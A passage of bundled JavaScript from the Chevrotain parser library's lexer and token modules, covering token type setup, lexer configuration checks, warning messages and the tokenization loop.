      type: LexerDefinitionErrorType.NO_LINE_BREAKS_FLAGS
    });
  }
  return warnings;
}
function cloneEmptyGroups(emptyGroups) {
  const clonedResult = {};
  const groupKeys = keys_default(emptyGroups);
  forEach_default(groupKeys, (currKey) => {
    const currGroupValue = emptyGroups[currKey];
    if (isArray_default(currGroupValue)) {
      clonedResult[currKey] = [];
    } else {
      throw Error("non exhaustive match");
    }
  });
  return clonedResult;
}
function isCustomPattern(tokenType) {
  const pattern = tokenType.PATTERN;
  if (isRegExp_default(pattern)) {
    return false;
  } else if (isFunction_default(pattern)) {
    return true;
  } else if (has_default(pattern, "exec")) {
    return true;
  } else if (isString_default(pattern)) {
    return false;
  } else {
    throw Error("non exhaustive match");
  }
}
function isShortPattern(pattern) {
  if (isString_default(pattern) && pattern.length === 1) {
    return pattern.charCodeAt(0);
  } else {
    return false;
  }
}
function checkLineBreaksIssues(tokType, lineTerminatorCharCodes) {
  if (has_default(tokType, "LINE_BREAKS")) {
    return false;
  } else {
    if (isRegExp_default(tokType.PATTERN)) {
      try {
        canMatchCharCode(lineTerminatorCharCodes, tokType.PATTERN);
      } catch (e) {
        return {
          issue: LexerDefinitionErrorType.IDENTIFY_TERMINATOR,
          errMsg: e.message
        };
      }
      return false;
    } else if (isString_default(tokType.PATTERN)) {
      return false;
    } else if (isCustomPattern(tokType)) {
      return { issue: LexerDefinitionErrorType.CUSTOM_LINE_BREAK };
    } else {
      throw Error("non exhaustive match");
    }
  }
}
function buildLineBreakIssueMessage(tokType, details) {
  if (details.issue === LexerDefinitionErrorType.IDENTIFY_TERMINATOR) {
    return `Warning: unable to identify line terminator usage in pattern.
	The problem is in the <${tokType.name}> Token Type
	 Root cause: ${details.errMsg}.
	For details See: https://chevrotain.io/docs/guide/resolving_lexer_errors.html#IDENTIFY_TERMINATOR`;
  } else if (details.issue === LexerDefinitionErrorType.CUSTOM_LINE_BREAK) {
    return `Warning: A Custom Token Pattern should specify the <line_breaks> option.
	The problem is in the <${tokType.name}> Token Type
	For details See: https://chevrotain.io/docs/guide/resolving_lexer_errors.html#CUSTOM_LINE_BREAK`;
  } else {
    throw Error("non exhaustive match");
  }
}
function getCharCodes(charsOrCodes) {
  const charCodes = map_default(charsOrCodes, (numOrString) => {
    if (isString_default(numOrString)) {
      return numOrString.charCodeAt(0);
    } else {
      return numOrString;
    }
  });
  return charCodes;
}
function addToMapOfArrays(map2, key, value) {
  if (map2[key] === void 0) {
    map2[key] = [value];
  } else {
    map2[key].push(value);
  }
}
function charCodeToOptimizedIndex(charCode) {
  return charCode < minOptimizationVal ? charCode : charCodeToOptimizedIdxMap[charCode];
}
function initCharCodeToOptimizedIndexMap() {
  if (isEmpty_default(charCodeToOptimizedIdxMap)) {
    charCodeToOptimizedIdxMap = new Array(65536);
    for (let i = 0; i < 65536; i++) {
      charCodeToOptimizedIdxMap[i] = i > 255 ? 255 + ~~(i / 255) : i;
    }
  }
}
var PATTERN, DEFAULT_MODE, MODES, SUPPORT_STICKY, end_of_input, start_of_input, LineTerminatorOptimizedTester, minOptimizationVal, charCodeToOptimizedIdxMap;
var init_lexer = __esm({
  "node_modules/chevrotain/lib/src/scan/lexer.js"() {
    init_api3();
    init_lexer_public();
    init_lodash();
    init_api();
    init_reg_exp();
    init_reg_exp_parser();
    PATTERN = "PATTERN";
    DEFAULT_MODE = "defaultMode";
    MODES = "modes";
    SUPPORT_STICKY = typeof new RegExp("(?:)").sticky === "boolean";
    end_of_input = /[^\\][$]/;
    start_of_input = /[^\\[][\^]|^\^/;
    LineTerminatorOptimizedTester = {
      // implements /\n|\r\n?/g.test
      test: function(text) {
        const len = text.length;
        for (let i = this.lastIndex; i < len; i++) {
          const c = text.charCodeAt(i);
          if (c === 10) {
            this.lastIndex = i + 1;
            return true;
          } else if (c === 13) {
            if (text.charCodeAt(i + 1) === 10) {
              this.lastIndex = i + 2;
            } else {
              this.lastIndex = i + 1;
            }
            return true;
          }
        }
        return false;
      },
      lastIndex: 0
    };
    minOptimizationVal = 256;
    charCodeToOptimizedIdxMap = [];
  }
});

// node_modules/chevrotain/lib/src/scan/tokens.js
function tokenStructuredMatcher(tokInstance, tokConstructor) {
  const instanceType = tokInstance.tokenTypeIdx;
  if (instanceType === tokConstructor.tokenTypeIdx) {
    return true;
  } else {
    return tokConstructor.isParent === true && tokConstructor.categoryMatchesMap[instanceType] === true;
  }
}
function tokenStructuredMatcherNoCategories(token, tokType) {
  return token.tokenTypeIdx === tokType.tokenTypeIdx;
}
function augmentTokenTypes(tokenTypes) {
  const tokenTypesAndParents = expandCategories(tokenTypes);
  assignTokenDefaultProps(tokenTypesAndParents);
  assignCategoriesMapProp(tokenTypesAndParents);
  assignCategoriesTokensProp(tokenTypesAndParents);
  forEach_default(tokenTypesAndParents, (tokType) => {
    tokType.isParent = tokType.categoryMatches.length > 0;
  });
}
function expandCategories(tokenTypes) {
  let result = clone_default(tokenTypes);
  let categories = tokenTypes;
  let searching = true;
  while (searching) {
    categories = compact_default(flatten_default(map_default(categories, (currTokType) => currTokType.CATEGORIES)));
    const newCategories = difference_default(categories, result);
    result = result.concat(newCategories);
    if (isEmpty_default(newCategories)) {
      searching = false;
    } else {
      categories = newCategories;
    }
  }
  return result;
}
function assignTokenDefaultProps(tokenTypes) {
  forEach_default(tokenTypes, (currTokType) => {
    if (!hasShortKeyProperty(currTokType)) {
      tokenIdxToClass[tokenShortNameIdx] = currTokType;
      currTokType.tokenTypeIdx = tokenShortNameIdx++;
    }
    if (hasCategoriesProperty(currTokType) && !isArray_default(currTokType.CATEGORIES)) {
      currTokType.CATEGORIES = [currTokType.CATEGORIES];
    }
    if (!hasCategoriesProperty(currTokType)) {
      currTokType.CATEGORIES = [];
    }
    if (!hasExtendingTokensTypesProperty(currTokType)) {
      currTokType.categoryMatches = [];
    }
    if (!hasExtendingTokensTypesMapProperty(currTokType)) {
      currTokType.categoryMatchesMap = {};
    }
  });
}
function assignCategoriesTokensProp(tokenTypes) {
  forEach_default(tokenTypes, (currTokType) => {
    currTokType.categoryMatches = [];
    forEach_default(currTokType.categoryMatchesMap, (val, key) => {
      currTokType.categoryMatches.push(tokenIdxToClass[key].tokenTypeIdx);
    });
  });
}
function assignCategoriesMapProp(tokenTypes) {
  forEach_default(tokenTypes, (currTokType) => {
    singleAssignCategoriesToksMap([], currTokType);
  });
}
function singleAssignCategoriesToksMap(path2, nextNode) {
  forEach_default(path2, (pathNode) => {
    nextNode.categoryMatchesMap[pathNode.tokenTypeIdx] = true;
  });
  forEach_default(nextNode.CATEGORIES, (nextCategory) => {
    const newPath = path2.concat(nextNode);
    if (!includes_default(newPath, nextCategory)) {
      singleAssignCategoriesToksMap(newPath, nextCategory);
    }
  });
}
function hasShortKeyProperty(tokType) {
  return has_default(tokType, "tokenTypeIdx");
}
function hasCategoriesProperty(tokType) {
  return has_default(tokType, "CATEGORIES");
}
function hasExtendingTokensTypesProperty(tokType) {
  return has_default(tokType, "categoryMatches");
}
function hasExtendingTokensTypesMapProperty(tokType) {
  return has_default(tokType, "categoryMatchesMap");
}
function isTokenType(tokType) {
  return has_default(tokType, "tokenTypeIdx");
}
var tokenShortNameIdx, tokenIdxToClass;
var init_tokens = __esm({
  "node_modules/chevrotain/lib/src/scan/tokens.js"() {
    init_lodash();
    tokenShortNameIdx = 1;
    tokenIdxToClass = {};
  }
});

// node_modules/chevrotain/lib/src/scan/lexer_errors_public.js
var defaultLexerErrorProvider;
var init_lexer_errors_public = __esm({
  "node_modules/chevrotain/lib/src/scan/lexer_errors_public.js"() {
    defaultLexerErrorProvider = {
      buildUnableToPopLexerModeMessage(token) {
        return `Unable to pop Lexer Mode after encountering Token ->${token.image}<- The Mode Stack is empty`;
      },
      buildUnexpectedCharactersMessage(fullText, startOffset, length, line, column, mode) {
        return `unexpected character: ->${fullText.charAt(startOffset)}<- at offset: ${startOffset}, skipped ${length} characters.`;
      }
    };
  }
});

// node_modules/chevrotain/lib/src/scan/lexer_public.js
var LexerDefinitionErrorType, DEFAULT_LEXER_CONFIG, Lexer2;
var init_lexer_public = __esm({
  "node_modules/chevrotain/lib/src/scan/lexer_public.js"() {
    init_lexer();
    init_lodash();
    init_api();
    init_tokens();
    init_lexer_errors_public();
    init_reg_exp_parser();
    (function(LexerDefinitionErrorType2) {
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["MISSING_PATTERN"] = 0] = "MISSING_PATTERN";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["INVALID_PATTERN"] = 1] = "INVALID_PATTERN";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["EOI_ANCHOR_FOUND"] = 2] = "EOI_ANCHOR_FOUND";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["UNSUPPORTED_FLAGS_FOUND"] = 3] = "UNSUPPORTED_FLAGS_FOUND";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["DUPLICATE_PATTERNS_FOUND"] = 4] = "DUPLICATE_PATTERNS_FOUND";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["INVALID_GROUP_TYPE_FOUND"] = 5] = "INVALID_GROUP_TYPE_FOUND";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["PUSH_MODE_DOES_NOT_EXIST"] = 6] = "PUSH_MODE_DOES_NOT_EXIST";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["MULTI_MODE_LEXER_WITHOUT_DEFAULT_MODE"] = 7] = "MULTI_MODE_LEXER_WITHOUT_DEFAULT_MODE";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["MULTI_MODE_LEXER_WITHOUT_MODES_PROPERTY"] = 8] = "MULTI_MODE_LEXER_WITHOUT_MODES_PROPERTY";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["MULTI_MODE_LEXER_DEFAULT_MODE_VALUE_DOES_NOT_EXIST"] = 9] = "MULTI_MODE_LEXER_DEFAULT_MODE_VALUE_DOES_NOT_EXIST";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["LEXER_DEFINITION_CANNOT_CONTAIN_UNDEFINED"] = 10] = "LEXER_DEFINITION_CANNOT_CONTAIN_UNDEFINED";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["SOI_ANCHOR_FOUND"] = 11] = "SOI_ANCHOR_FOUND";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["EMPTY_MATCH_PATTERN"] = 12] = "EMPTY_MATCH_PATTERN";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["NO_LINE_BREAKS_FLAGS"] = 13] = "NO_LINE_BREAKS_FLAGS";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["UNREACHABLE_PATTERN"] = 14] = "UNREACHABLE_PATTERN";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["IDENTIFY_TERMINATOR"] = 15] = "IDENTIFY_TERMINATOR";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["CUSTOM_LINE_BREAK"] = 16] = "CUSTOM_LINE_BREAK";
      LexerDefinitionErrorType2[LexerDefinitionErrorType2["MULTI_MODE_LEXER_LONGER_ALT_NOT_IN_CURRENT_MODE"] = 17] = "MULTI_MODE_LEXER_LONGER_ALT_NOT_IN_CURRENT_MODE";
    })(LexerDefinitionErrorType || (LexerDefinitionErrorType = {}));
    DEFAULT_LEXER_CONFIG = {
      deferDefinitionErrorsHandling: false,
      positionTracking: "full",
      lineTerminatorsPattern: /\n|\r\n?/g,
      lineTerminatorCharacters: ["\n", "\r"],
      ensureOptimizations: false,
      safeMode: false,
      errorMessageProvider: defaultLexerErrorProvider,
      traceInitPerf: false,
      skipValidations: false,
      recoveryEnabled: true
    };
    Object.freeze(DEFAULT_LEXER_CONFIG);
    Lexer2 = class {
      constructor(lexerDefinition, config = DEFAULT_LEXER_CONFIG) {
        this.lexerDefinition = lexerDefinition;
        this.lexerDefinitionErrors = [];
        this.lexerDefinitionWarning = [];
        this.patternIdxToConfig = {};
        this.charCodeToPatternIdxToConfig = {};
        this.modes = [];
        this.emptyGroups = {};
        this.trackStartLines = true;
        this.trackEndLines = true;
        this.hasCustom = false;
        this.canModeBeOptimized = {};
        this.TRACE_INIT = (phaseDesc, phaseImpl) => {
          if (this.traceInitPerf === true) {
            this.traceInitIndent++;
            const indent = new Array(this.traceInitIndent + 1).join("	");
            if (this.traceInitIndent < this.traceInitMaxIdent) {
              console.log(`${indent}--> <${phaseDesc}>`);
            }
            const { time, value } = timer(phaseImpl);
            const traceMethod = time > 10 ? console.warn : console.log;
            if (this.traceInitIndent < this.traceInitMaxIdent) {
              traceMethod(`${indent}<-- <${phaseDesc}> time: ${time}ms`);
            }
            this.traceInitIndent--;
            return value;
          } else {
            return phaseImpl();
          }
        };
        if (typeof config === "boolean") {
          throw Error("The second argument to the Lexer constructor is now an ILexerConfig Object.\na boolean 2nd argument is no longer supported");
        }
        this.config = assign_default({}, DEFAULT_LEXER_CONFIG, config);
        const traceInitVal = this.config.traceInitPerf;
        if (traceInitVal === true) {
          this.traceInitMaxIdent = Infinity;
          this.traceInitPerf = true;
        } else if (typeof traceInitVal === "number") {
          this.traceInitMaxIdent = traceInitVal;
          this.traceInitPerf = true;
        }
        this.traceInitIndent = -1;
        this.TRACE_INIT("Lexer Constructor", () => {
          let actualDefinition;
          let hasOnlySingleMode = true;
          this.TRACE_INIT("Lexer Config handling", () => {
            if (this.config.lineTerminatorsPattern === DEFAULT_LEXER_CONFIG.lineTerminatorsPattern) {
              this.config.lineTerminatorsPattern = LineTerminatorOptimizedTester;
            } else {
              if (this.config.lineTerminatorCharacters === DEFAULT_LEXER_CONFIG.lineTerminatorCharacters) {
                throw Error("Error: Missing <lineTerminatorCharacters> property on the Lexer config.\n	For details See: https://chevrotain.io/docs/guide/resolving_lexer_errors.html#MISSING_LINE_TERM_CHARS");
              }
            }
            if (config.safeMode && config.ensureOptimizations) {
              throw Error('"safeMode" and "ensureOptimizations" flags are mutually exclusive.');
            }
            this.trackStartLines = /full|onlyStart/i.test(this.config.positionTracking);
            this.trackEndLines = /full/i.test(this.config.positionTracking);
            if (isArray_default(lexerDefinition)) {
              actualDefinition = {
                modes: { defaultMode: clone_default(lexerDefinition) },
                defaultMode: DEFAULT_MODE
              };
            } else {
              hasOnlySingleMode = false;
              actualDefinition = clone_default(lexerDefinition);
            }
          });
          if (this.config.skipValidations === false) {
            this.TRACE_INIT("performRuntimeChecks", () => {
              this.lexerDefinitionErrors = this.lexerDefinitionErrors.concat(performRuntimeChecks(actualDefinition, this.trackStartLines, this.config.lineTerminatorCharacters));
            });
            this.TRACE_INIT("performWarningRuntimeChecks", () => {
              this.lexerDefinitionWarning = this.lexerDefinitionWarning.concat(performWarningRuntimeChecks(actualDefinition, this.trackStartLines, this.config.lineTerminatorCharacters));
            });
          }
          actualDefinition.modes = actualDefinition.modes ? actualDefinition.modes : {};
          forEach_default(actualDefinition.modes, (currModeValue, currModeName) => {
            actualDefinition.modes[currModeName] = reject_default(currModeValue, (currTokType) => isUndefined_default(currTokType));
          });
          const allModeNames = keys_default(actualDefinition.modes);
          forEach_default(actualDefinition.modes, (currModDef, currModName) => {
            this.TRACE_INIT(`Mode: <${currModName}> processing`, () => {
              this.modes.push(currModName);
              if (this.config.skipValidations === false) {
                this.TRACE_INIT(`validatePatterns`, () => {
                  this.lexerDefinitionErrors = this.lexerDefinitionErrors.concat(validatePatterns(currModDef, allModeNames));
                });
              }
              if (isEmpty_default(this.lexerDefinitionErrors)) {
                augmentTokenTypes(currModDef);
                let currAnalyzeResult;
                this.TRACE_INIT(`analyzeTokenTypes`, () => {
                  currAnalyzeResult = analyzeTokenTypes(currModDef, {
                    lineTerminatorCharacters: this.config.lineTerminatorCharacters,
                    positionTracking: config.positionTracking,
                    ensureOptimizations: config.ensureOptimizations,
                    safeMode: config.safeMode,
                    tracer: this.TRACE_INIT
                  });
                });
                this.patternIdxToConfig[currModName] = currAnalyzeResult.patternIdxToConfig;
                this.charCodeToPatternIdxToConfig[currModName] = currAnalyzeResult.charCodeToPatternIdxToConfig;
                this.emptyGroups = assign_default({}, this.emptyGroups, currAnalyzeResult.emptyGroups);
                this.hasCustom = currAnalyzeResult.hasCustom || this.hasCustom;
                this.canModeBeOptimized[currModName] = currAnalyzeResult.canBeOptimized;
              }
            });
          });
          this.defaultMode = actualDefinition.defaultMode;
          if (!isEmpty_default(this.lexerDefinitionErrors) && !this.config.deferDefinitionErrorsHandling) {
            const allErrMessages = map_default(this.lexerDefinitionErrors, (error) => {
              return error.message;
            });
            const allErrMessagesString = allErrMessages.join("-----------------------\n");
            throw new Error("Errors detected in definition of Lexer:\n" + allErrMessagesString);
          }
          forEach_default(this.lexerDefinitionWarning, (warningDescriptor) => {
            PRINT_WARNING(warningDescriptor.message);
          });
          this.TRACE_INIT("Choosing sub-methods implementations", () => {
            if (SUPPORT_STICKY) {
              this.chopInput = identity_default;
              this.match = this.matchWithTest;
            } else {
              this.updateLastIndex = noop_default;
              this.match = this.matchWithExec;
            }
            if (hasOnlySingleMode) {
              this.handleModes = noop_default;
            }
            if (this.trackStartLines === false) {
              this.computeNewColumn = identity_default;
            }
            if (this.trackEndLines === false) {
              this.updateTokenEndLineColumnLocation = noop_default;
            }
            if (/full/i.test(this.config.positionTracking)) {
              this.createTokenInstance = this.createFullToken;
            } else if (/onlyStart/i.test(this.config.positionTracking)) {
              this.createTokenInstance = this.createStartOnlyToken;
            } else if (/onlyOffset/i.test(this.config.positionTracking)) {
              this.createTokenInstance = this.createOffsetOnlyToken;
            } else {
              throw Error(`Invalid <positionTracking> config option: "${this.config.positionTracking}"`);
            }
            if (this.hasCustom) {
              this.addToken = this.addTokenUsingPush;
              this.handlePayload = this.handlePayloadWithCustom;
            } else {
              this.addToken = this.addTokenUsingMemberAccess;
              this.handlePayload = this.handlePayloadNoCustom;
            }
          });
          this.TRACE_INIT("Failed Optimization Warnings", () => {
            const unOptimizedModes = reduce_default(this.canModeBeOptimized, (cannotBeOptimized, canBeOptimized, modeName) => {
              if (canBeOptimized === false) {
                cannotBeOptimized.push(modeName);
              }
              return cannotBeOptimized;
            }, []);
            if (config.ensureOptimizations && !isEmpty_default(unOptimizedModes)) {
              throw Error(`Lexer Modes: < ${unOptimizedModes.join(", ")} > cannot be optimized.
	 Disable the "ensureOptimizations" lexer config flag to silently ignore this and run the lexer in an un-optimized mode.
	 Or inspect the console log for details on how to resolve these issues.`);
            }
          });
          this.TRACE_INIT("clearRegExpParserCache", () => {
            clearRegExpParserCache();
          });
          this.TRACE_INIT("toFastProperties", () => {
            toFastProperties(this);
          });
        });
      }
      tokenize(text, initialMode = this.defaultMode) {
        if (!isEmpty_default(this.lexerDefinitionErrors)) {
          const allErrMessages = map_default(this.lexerDefinitionErrors, (error) => {
            return error.message;
          });
          const allErrMessagesString = allErrMessages.join("-----------------------\n");
          throw new Error("Unable to Tokenize because Errors detected in definition of Lexer:\n" + allErrMessagesString);
        }
        return this.tokenizeInternal(text, initialMode);
      }
      // There is quite a bit of duplication between this and "tokenizeInternalLazy"
      // This is intentional due to performance considerations.
      // this method also used quite a bit of `!` none null assertions because it is too optimized
      // for `tsc` to always understand it is "safe"
      tokenizeInternal(text, initialMode) {
        let i, j, k, matchAltImage, longerAlt, matchedImage, payload, altPayload, imageLength, group, tokType, newToken, errLength, droppedChar, msg, match;
        const orgText = text;
        const orgLength = orgText.length;
        let offset = 0;
        let matchedTokensIndex = 0;
        const guessedNumberOfTokens = this.hasCustom ? 0 : Math.floor(text.length / 10);
        const matchedTokens = new Array(guessedNumberOfTokens);
        const errors = [];
        let line = this.trackStartLines ? 1 : void 0;
        let column = this.trackStartLines ? 1 : void 0;
        const groups = cloneEmptyGroups(this.emptyGroups);
        const trackLines = this.trackStartLines;
        const lineTerminatorPattern = this.config.lineTerminatorsPattern;
        let currModePatternsLength = 0;
        let patternIdxToConfig = [];
        let currCharCodeToPatternIdxToConfig = [];
        const modeStack = [];
        const emptyArray = [];
        Object.freeze(emptyArray);
        let getPossiblePatterns;
        function getPossiblePatternsSlow() {
          return patternIdxToConfig;
        }
        function getPossiblePatternsOptimized(charCode) {
          const optimizedCharIdx = charCodeToOptimizedIndex(charCode);
          const possiblePatterns = currCharCodeToPatternIdxToConfig[optimizedCharIdx];
          if (possiblePatterns === void 0) {
            return emptyArray;
          } else {
            return possiblePatterns;
          }
        }
        const pop_mode = (popToken) => {
          if (modeStack.length === 1 && // if we have both a POP_MODE and a PUSH_MODE this is in-fact a "transition"
          // So no error should occur.
          popToken.tokenType.PUSH_MODE === void 0) {
            const msg2 = this.config.errorMessageProvider.buildUnableToPopLexerModeMessage(popToken);
            errors.push({
              offset: popToken.startOffset,
              line: popToken.startLine,
              column: popToken.startColumn,
              length: popToken.image.length,
              message: msg2
            });
          } else {
            modeStack.pop();
            const newMode = last_default(modeStack);
            patternIdxToConfig = this.patternIdxToConfig[newMode];
            currCharCodeToPatternIdxToConfig = this.charCodeToPatternIdxToConfig[newMode];
            currModePatternsLength = patternIdxToConfig.length;
            const modeCanBeOptimized = this.canModeBeOptimized[newMode] && this.config.safeMode === false;
            if (currCharCodeToPatternIdxToConfig && modeCanBeOptimized) {
              getPossiblePatterns = getPossiblePatternsOptimized;
            } else {
              getPossiblePatterns = getPossiblePatternsSlow;
            }
          }
        };
        function push_mode(newMode) {
          modeStack.push(newMode);
          currCharCodeToPatternIdxToConfig = this.charCodeToPatternIdxToConfig[newMode];
          patternIdxToConfig = this.patternIdxToConfig[newMode];
          currModePatternsLength = patternIdxToConfig.length;
          currModePatternsLength = patternIdxToConfig.length;
          const modeCanBeOptimized = this.canModeBeOptimized[newMode] && this.config.safeMode === false;
          if (currCharCodeToPatternIdxToConfig && modeCanBeOptimized) {
            getPossiblePatterns = getPossiblePatternsOptimized;
          } else {
            getPossiblePatterns = getPossiblePatternsSlow;
          }
        }
        push_mode.call(this, initialMode);
        let currConfig;
        const recoveryEnabled = this.config.recoveryEnabled;
        while (offset < orgLength) {
          matchedImage = null;
          const nextCharCode = orgText.charCodeAt(offset);
          const chosenPatternIdxToConfig = getPossiblePatterns(nextCharCode);
          const chosenPatternsLength = chosenPatternIdxToConfig.length;
          for (i = 0; i < chosenPatternsLength; i++) {
            currConfig = chosenPatternIdxToConfig[i];
            const currPattern = currConfig.pattern;
            payload = null;
            const singleCharCode = currConfig.short;
            if (singleCharCode !== false) {
              if (nextCharCode === singleCharCode) {
                matchedImage = currPattern;
              }
            } else if (currConfig.isCustom === true) {
              match = currPattern.exec(orgText, offset, matchedTokens, groups);
              if (match !== null) {
                matchedImage = match[0];
                if (match.payload !== void 0) {
                  payload = match.payload;
                }
              } else {
                matchedImage = null;
              }
            } else {
              this.updateLastIndex(currPattern, offset);
              matchedImage = this.match(currPattern, text, offset);
            }
            if (matchedImage !== null) {
              longerAlt = currConfig.longerAlt;
              if (longerAlt !== void 0) {
                const longerAltLength = longerAlt.length;
                for (k = 0; k < longerAltLength; k++) {
                  const longerAltConfig = patternIdxToConfig[longerAlt[k]];
                  const longerAltPattern = longerAltConfig.pattern;
                  altPayload = null;
                  if (longerAltConfig.isCustom === true) {
                    match = longerAltPattern.exec(orgText, offset, matchedTokens, groups);
                    if (match !== null) {
                      matchAltImage = match[0];
                      if (match.payload !== void 0) {
                        altPayload = match.payload;
                      }
                    } else {
                      matchAltImage = null;
                    }
                  } else {
                    this.updateLastIndex(longerAltPattern, offset);
                    matchAltImage = this.match(longerAltPattern, text, offset);
                  }
                  if (matchAltImage && matchAltImage.length > matchedImage.length) {
                    matchedImage = matchAltImage;
                    payload = altPayload;
                    currConfig = longerAltConfig;
                    break;
                  }
                }
              }
              break;
            }
          }
          if (matchedImage !== null) {
            imageLength = matchedImage.length;
            group = currConfig.group;
            if (group !== void 0) {
              tokType = currConfig.tokenTypeIdx;
              newToken = this.createTokenInstance(matchedImage, offset, tokType, currConfig.tokenType, line, column, imageLength);
              this.handlePayload(newToken, payload);
              if (group === false) {
                matchedTokensIndex = this.addToken(matchedTokens, matchedTokensIndex, newToken);
              } else {
                groups[group].push(newToken);
              }
            }
            text = this.chopInput(text, imageLength);
            offset = offset + imageLength;
            column = this.computeNewColumn(column, imageLength);
            if (trackLines === true && currConfig.canLineTerminator === true) {
              let numOfLTsInMatch = 0;
              let foundTerminator;
              let lastLTEndOffset;
              lineTerminatorPattern.lastIndex = 0;
              do {
                foundTerminator = lineTerminatorPattern.test(matchedImage);
                if (foundTerminator === true) {
                  lastLTEndOffset = lineTerminatorPattern.lastIndex - 1;
                  numOfLTsInMatch++;
                }
              } while (foundTerminator === true);
              if (numOfLTsInMatch !== 0) {
                line = line + numOfLTsInMatch;
                column = imageLength - lastLTEndOffset;
                this.updateTokenEndLineColumnLocation(newToken, group, lastLTEndOffset, numOfLTsInMatch, line, column, imageLength);
              }
            }
            this.handleModes(currConfig, pop_mode, push_mode, newToken);
          } else {
            const errorStartOffset = offset;
            const errorLine = line;
            const errorColumn = column;
            let foundResyncPoint = recoveryEnabled === false;
            while (foundResyncPoint === false && offset < orgLength) {
              text = this.chopInput(text, 1);
              offset++;
              for (j = 0; j < currModePatternsLength; j++) {
                const currConfig2 = patternIdxToConfig[j];
                const currPattern = currConfig2.pattern;
                const singleCharCode = currConfig2.short;
                if (singleCharCode !== false) {
                  if (orgText.charCodeAt(offset) === singleCharCode) {
                    foundResyncPoint = true;
                  }
                } else if (currConfig2.isCustom === true) {
                  foundResyncPoint = currPattern.exec(orgText, offset, matchedTokens, groups) !== null;
                } else {
                  this.updateLastIndex(currPattern, offset);
                  foundResyncPoint = currPattern.exec(text) !== null;
                }
                if (foundResyncPoint === true) {
                  break;
                }
              }
            }
            errLength = offset - errorStartOffset;
            column = this.computeNewColumn(column, errLength);
            msg = this.config.errorMessageProvider.buildUnexpectedCharactersMessage(orgText, errorStartOffset, errLength, errorLine, errorColumn, last_default(modeStack));
            errors.push({
              offset: errorStartOffset,
              line: errorLine,
              column: errorColumn,
              length: errLength,
              message: msg
            });
            if (recoveryEnabled === false) {
              break;
            }
          }
        }
        if (!this.hasCustom) {
          matchedTokens.length = matchedTokensIndex;
        }
        return {
          tokens: matchedTokens,
          groups,
          errors
        };
      }
      handleModes(config, pop_mode, push_mode, newToken) {
        if (config.pop === true) {
          const pushMode = config.push;
          pop_mode(newToken);
          if (pushMode !== void 0) {
            push_mode.call(this, pushMode);
          }
        } else if (config.push !== void 0) {
          push_mode.call(this, config.push);
        }
      }
      chopInput(text, length) {
        return text.substring(length);
      }
      updateLastIndex(regExp, newLastIndex) {
        regExp.lastIndex = newLastIndex;
      }
      // TODO: decrease this under 600 characters? inspect stripping comments option in TSC compiler
      updateTokenEndLineColumnLocation(newToken, group, lastLTIdx, numOfLTsInMatch, line, column, imageLength) {
        let lastCharIsLT, fixForEndingInLT;
        if (group !== void 0) {
          lastCharIsLT = lastLTIdx === imageLength - 1;
          fixForEndingInLT = lastCharIsLT ? -1 : 0;
          if (!(numOfLTsInMatch === 1 && lastCharIsLT === true)) {
            newToken.endLine = line + fixForEndingInLT;
            newToken.endColumn = column - 1 + -fixForEndingInLT;
          }
        }
      }
      computeNewColumn(oldColumn, imageLength) {
        return oldColumn + imageLength;
      }
      createOffsetOnlyToken(image, startOffset, tokenTypeIdx, tokenType) {
        return {
          image,
          startOffset,
          tokenTypeIdx,
          tokenType
        };
      }
      createStartOnlyToken(image, startOffset, tokenTypeIdx, tokenType, startLine, startColumn) {
        return {
          image,
          startOffset,
          startLine,
          startColumn,
          tokenTypeIdx,
          tokenType
        };
      }
      createFullToken(image, startOffset, tokenTypeIdx, tokenType, startLine, startColumn, imageLength) {
        return {
          image,
          startOffset,
          endOffset: startOffset + imageLength - 1,
          startLine,
          endLine: startLine,
          startColumn,
          endColumn: startColumn + imageLength - 1,
          tokenTypeIdx,
          tokenType
        };
      }
      addTokenUsingPush(tokenVector, index, tokenToAdd) {
        tokenVector.push(tokenToAdd);
        return index;
      }
      addTokenUsingMemberAccess(tokenVector, index, tokenToAdd) {
        tokenVector[index] = tokenToAdd;
        index++;
        return index;
      }
      handlePayloadNoCustom(token, payload) {
      }
      handlePayloadWithCustom(token, payload) {
        if (payload !== null) {
          token.payload = payload;
        }
      }
      matchWithTest(pattern, text, offset) {
        const found = pattern.test(text);
        if (found === true) {
          return text.substring(offset, pattern.lastIndex);
        }
        return null;
      }
      matchWithExec(pattern, text) {
        const regExpArray = pattern.exec(text);
        return regExpArray !== null ? regExpArray[0] : null;
      }
    };
    Lexer2.SKIPPED = "This marks a skipped Token pattern, this means each token identified by it will be consumed and then thrown into oblivion, this can be used to for example to completely ignore whitespace.";
    Lexer2.NA = /NOT_APPLICABLE/;
  }
});

// node_modules/chevrotain/lib/src/scan/tokens_public.js
function tokenLabel2(tokType) {
  if (hasTokenLabel2(tokType)) {
    return tokType.LABEL;
  } else {
    return tokType.name;
  }
}
function tokenName(tokType) {
  return tokType.name;
}
function hasTokenLabel2(obj) {
  return isString_default(obj.LABEL) && obj.LABEL !== "";
}
function createToken2(config) {
  return createTokenInternal(config);
}
function createTokenInternal(config) {
  const pattern = config.pattern;
  const tokenType = {};
  tokenType.name = config.name;
  if (!isUndefined_default(pattern)) {
    tokenType.PATTERN = pattern;
  }
  if (has_default(config, PARENT)) {
    throw "The parent property is no longer supported.\nSee: https://github.com/chevrotain/chevrotain/issues/564#issuecomment-349062346 for details.";
  }
  if (has_default(config, CATEGORIES)) {
    tokenType.CATEGORIES = config[CATEGORIES];
  }
  augmentTokenTypes([tokenType]);
  if (has_default(config, LABEL)) {
    tokenType.LABEL = config[LABEL];
  }
  if (has_default(config, GROUP)) {
    tokenType.GROUP = config[GROUP];
  }
  if (has_default(config, POP_MODE)) {
    tokenType.POP_MODE = config[POP_MODE];
  }
